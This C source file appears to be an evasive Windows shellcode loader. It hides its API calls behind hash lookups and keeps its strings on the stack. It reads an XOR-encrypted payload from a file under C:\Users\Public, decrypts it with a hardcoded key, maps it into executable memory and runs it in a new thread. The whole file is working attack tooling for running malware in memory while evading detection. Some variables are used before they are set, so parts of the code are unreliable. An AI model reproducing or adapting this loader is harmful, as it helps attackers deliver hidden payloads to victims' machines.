#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"
#include "64BitHelper.h"
#include <windows.h>

typedef DWORD (WINAPI* FuncResumeThread) (
	HANDLE hThread
);

typedef struct _CID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CID, * PCID;

typedef NTSTATUS (NTAPI *FuncRtlCreateUserThread) (
	IN HANDLE               ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN              CreateSuspended,
	IN ULONG                StackZeroBits,
	IN OUT PULONG           StackReserved,
	IN OUT PULONG           StackCommit,
	IN PVOID                StartAddress,
	IN PVOID                StartParameter OPTIONAL,
	OUT PHANDLE             ThreadHandle,
	OUT PCID				ClientID
);

typedef NTSTATUS(NTAPI* ZwCreateSection)
(_Out_ PHANDLE SectionHandle, _In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PLARGE_INTEGER MaximumSize, _In_ ULONG SectionPageProtection,
	_In_ ULONG AllocationAttributes, _In_opt_ HANDLE FileHandle);


typedef NTSTATUS(NTAPI* NtMapViewOfSection)
(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle,
	_Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize,
	_Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize,
	_In_ DWORD InheritDisposition, _In_ ULONG AllocationType,
	_In_ ULONG Win32Protect);


typedef HANDLE (WINAPI* FuncCreateFile) (
	LPCSTR                lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
);

typedef HANDLE (WINAPI* FuncGetCurrentProcess)();

typedef VOID (NTAPI* FuncRtlMoveMemory)(
	_Out_       VOID UNALIGNED* Destination,
	_In_  const VOID UNALIGNED* Source,
	_In_        SIZE_T         Length
);

typedef LPVOID (WINAPI* FuncMapViewOfFile)(
	HANDLE hFileMappingObject,
	DWORD  dwDesiredAccess,
	DWORD  dwFileOffsetHigh,
	DWORD  dwFileOffsetLow,
	SIZE_T dwNumberOfBytesToMap
);

typedef VOID (NTAPI * FuncRtlInitUnicodeString)(
	PUNICODE_STRING         DestinationString,
	__drv_aliasesMem PCWSTR SourceString
);

typedef HGLOBAL (WINAPI* FuncGlobalAlloc)(
	UINT   uFlags,
	SIZE_T dwBytes
);

typedef VOID(NTAPI* FuncRtlExitUserProcess)(
	_In_ NTSTATUS ExitStatus
);


typedef DWORD (WINAPI* FuncWaitForSingleObject)(
	HANDLE hHandle,
	DWORD  dwMilliseconds
);

typedef DWORD (WINAPI *FuncGetProcessId)(
	HANDLE Process
);

typedef BOOL (WINAPI* FuncReadFile)(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
);

typedef DWORD (WINAPI* FuncGetCurrentThreadId)();

typedef DWORD (WINAPI* FuncGetFileSize)(
	HANDLE  hFile,
	LPDWORD lpFileSizeHigh
);

typedef NTSYSAPI VOID (NTAPI*  FuncRtlInitUnicodeString)(
	PUNICODE_STRING         DestinationString,
	__drv_aliasesMem PCWSTR SourceString
);

VOID EntryFunc(VOID)
{

	FuncRtlInitUnicodeString MyRtlInitUnicodeString;
	FuncRtlCreateUserThread MyRtlCreateUserThread;
	FuncGetFileSize MyGetFileSize;
	FuncReadFile MyReadFile;
	FuncGetCurrentThreadId MyGetCurrentThreadId;
	FuncWaitForSingleObject MyWaitForSingleObject;
	FuncRtlExitUserProcess MyRtlExitUserProcess;
	FuncGlobalAlloc MyGlobalAlloc;
	FuncRtlMoveMemory MyRtlMoveMemory;
	FuncGetCurrentProcess MyGetCurrentProcess;
	FuncCreateFile MyCreateFile;
	NtMapViewOfSection MyNtMapViewOfSection;
	ZwCreateSection MyZwCreateSection;


	HANDLE hShellcode = NULL;
	LPVOID lpShellcode = NULL;
	PVOID shellcodeSection = NULL;
	LARGE_INTEGER maxSize;
	// This is needed to specify how big the section is going to be
	// HighPart is not needed for pages smaller than 4GB
	maxSize.HighPart = 0;
	// Must pay attention to it during copying the shellcode
	// Note: Won't work with Reflective Loaders with the size of >1MBs
	maxSize.LowPart = 0x1000000;
	SIZE_T viewSize = 0;
	DWORD inheritDisposition = 1;
	DWORD dwRead = 0;
	PCHAR pTempChar;
	HANDLE hThread;
	UNICODE_STRING ntdllUnicode;
	HANDLE hNtdll, hNtddlMapping;
	LPVOID pNtdllBase;


	// Stack strings
	// Can be changed to whatever
	char ntdll_dll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	char shellcode_filename[] = { 'C',':','\\','U','s','e','r','s','\\','P','u','b','l','i','c','\\','c','o','d','e' ,'.','d','a','t',0 };
	char xor_key[] = { '\x32', '\x47', '\x68', '\x84', '\x59', '\x91', '\x34' ,'\x17', '\x58', '\x13', '\x77', '\x69' ,'\x09' ,'\x11', '\x19', '\x94', 0 };
	DWORD xor_key_len = 16;

	#pragma warning( push )
	#pragma warning( disable : 4055 ) // Ignore cast warnings
	#pragma warning( disable : 6001 ) // Ignore uninitialized warnings
	
	// To calculate the RORhash for a given function: powershell.exe lib\Get-FunctionHash.ps1 moduleName FunctionName
	// E.g powershell.exe Get-FunctionHash.ps1 kernel32.dll CreateProcessW
	// kernel32.dll functions
	MyWaitForSingleObject =		(FuncWaitForSingleObject)GetProcAddressWithHash(0x601D8708, ntdllUnicode, 0);
	MyGetFileSize =				(FuncGetFileSize)GetProcAddressWithHash(0x701E12C6, ntdllUnicode, 0);
	MyReadFile =				(FuncReadFile)GetProcAddressWithHash(0xBB5F9EAD, ntdllUnicode, 0);
	MyCreateFile =				(FuncCreateFile) GetProcAddressWithHash(0x4FDAF6DA, ntdllUnicode, 0);
	MyGetCurrentProcess =		(FuncGetCurrentProcess) GetProcAddressWithHash(0x51E2F352, ntdllUnicode, 0);
	MyGetCurrentThreadId =		(FuncGetCurrentThreadId)GetProcAddressWithHash(0x5FA0C4B9, ntdllUnicode, 0);
	MyGlobalAlloc =				(FuncGlobalAlloc)GetProcAddressWithHash(0x520F76F6, ntdllUnicode, 0);


	// ntdll.dll functions
	MyRtlCreateUserThread =		(FuncRtlCreateUserThread)GetProcAddressWithHash(0x40A438C8, ntdllUnicode, pNtdllBase);
	MyNtMapViewOfSection =		(NtMapViewOfSection)GetProcAddressWithHash(0x1B40BFFB, ntdllUnicode, pNtdllBase);
	MyZwCreateSection =			(ZwCreateSection)GetProcAddressWithHash(0x9CF500E5, ntdllUnicode, pNtdllBase);
	MyRtlMoveMemory =			(FuncRtlMoveMemory)GetProcAddressWithHash(0x81788FF6, ntdllUnicode, pNtdllBase);
	MyRtlExitUserProcess =		(FuncRtlExitUserProcess)GetProcAddressWithHash(0xAA1B814D, ntdllUnicode, pNtdllBase);
	#pragma warning( pop )
	
	
	// Actual operations
	HANDLE hShfile = MyCreateFile(shellcode_filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (!(hShfile == INVALID_HANDLE_VALUE || hShfile == NULL)) {
		DWORD fileSize = MyGetFileSize(hShfile, NULL);
		
		lpShellcode = MyGlobalAlloc(GPTR, fileSize);
		BOOL read = MyReadFile(hShfile, lpShellcode, fileSize, &dwRead, NULL);
		if (read == FALSE) {
			MyRtlExitUserProcess(0);
		}
	}
	else {
		MyRtlExitUserProcess(0);
	}

	// Create a new section for the shellcode
	MyZwCreateSection(&hShellcode, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	// Map the section to the current process
	MyNtMapViewOfSection(hShellcode, MyGetCurrentProcess(), &shellcodeSection, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE);

	// Decrypt & Move the contents of the file to the shellcode section
	for (unsigned i = 0; i < dwRead; i++) {
		*((PCHAR)lpShellcode + i) = *((PCHAR)lpShellcode + i) ^ xor_key[i % xor_key_len];
	}
	MyRtlMoveMemory(shellcodeSection, lpShellcode, dwRead);
	// Create a new thread to execute the decrytped shellcode
	MyRtlCreateUserThread(MyGetCurrentProcess(), NULL, FALSE, 0, 0, 0, shellcodeSection, NULL, &hThread, NULL);
	// Wait for the thread to finish its job
	MyWaitForSingleObject(hThread, INFINITE);

}